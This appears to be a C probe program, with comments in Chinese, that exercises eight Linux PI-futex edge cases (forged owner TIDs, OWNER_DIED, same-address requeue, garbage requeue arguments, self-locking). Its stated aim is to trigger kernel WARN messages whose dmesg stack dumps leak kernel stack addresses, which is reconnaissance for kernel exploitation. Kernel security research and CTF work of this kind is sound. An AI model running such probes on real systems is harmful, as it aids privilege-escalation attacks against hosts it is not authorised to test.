/*
 * warnprobe：在**同一条线程**上尝试各种 PI-futex 边界情况，
 * 目的不是利用，而是看哪一种能触发内核 WARN（dump_stack 会打印该线程的
 * 寄存器/栈地址，而 dmesg 对 shell 可读 → 栈地址泄漏）。
 * 每种场景在独立子线程里跑，避免互相污染 pi_state_cache。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>

#define FUTEX_WAIT 0
#define FUTEX_WAKE 1
#define FUTEX_REQUEUE 3
#define FUTEX_CMP_REQUEUE 4
#define FUTEX_WAKE_OP 5
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_TRYLOCK_PI 8
#define FUTEX_WAIT_BITSET 9
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#define FUTEX_OWNER_DIED 0x40000000

#define SYS_FUTEX 240

static int futex(int *uaddr, int op, int val, const struct timespec *to,
                 int *uaddr2, int val3)
{
	return syscall(SYS_FUTEX, uaddr, op, val, to, uaddr2, val3);
}

static int *U;

static void *scenario(void *a)
{
	long id = (long)a;
	cpu_set_t cs;
	CPU_ZERO(&cs); CPU_SET(0, &cs); sched_setaffinity(0, sizeof cs, &cs);

	/* 每个场景都在全新线程里，pi_state_cache 是空的 */
	switch (id) {
	case 0:   /* 普通 LOCK_PI / UNLOCK_PI —— 基线 */
		*U = 0;
		futex(U, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
		futex(U, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
		break;
	case 1:   /* uval 里是伪造的 TID */
		*U = getpid() + 12345;
		futex(U, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
		*U = 0;
		break;
	case 2:   /* OWNER_DIED */
		*U = FUTEX_OWNER_DIED | (getpid() + 999);
		futex(U, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
		*U = 0;
		break;
	case 3:   /* WAIT_REQUEUE_PI: uaddr2 == uaddr */
		*U = 0;
		{
			struct timespec ts = {0, 50000000};
			futex(U, FUTEX_WAIT_REQUEUE_PI, 0, &ts, U, 0);
		}
		break;
	case 4:   /* WAIT_REQUEUE_PI 正常形态，超时退出 */
		*U = 0;
		{
			struct timespec ts = {0, 50000000};
			futex(U, FUTEX_WAIT_REQUEUE_PI, 0, &ts, U + 1, 0);
		}
		break;
	case 5:   /* CMP_REQUEUE_PI 垃圾参数 */
		*U = 0;
		futex(U, FUTEX_CMP_REQUEUE_PI, 1, NULL, U + 1, 0xdead);
		break;
	case 6:   /* TRYLOCK_PI on bogus */
		*U = getpid() + 4242;
		futex(U, FUTEX_TRYLOCK_PI, 0, NULL, NULL, 0);
		*U = 0;
		break;
	case 7:   /* LOCK_PI 后自己再 LOCK_PI（自锁） */
		*U = 0;
		futex(U, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
		futex(U, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
		futex(U, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
		break;
	}
	return NULL;
}

int main(void)
{
	int i;
	U = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
	         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (U == MAP_FAILED) { printf("mmap fail\n"); return 1; }
	U[0] = U[1] = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== warnprobe pid=%d ===\n", getpid());
	for (i = 0; i < 8; i++) {
		pthread_t th;
		pthread_create(&th, NULL, scenario, (void *)(long)i);
		pthread_join(th, NULL);
		usleep(20000);
	}
	printf("done\n");
	return 0;
}
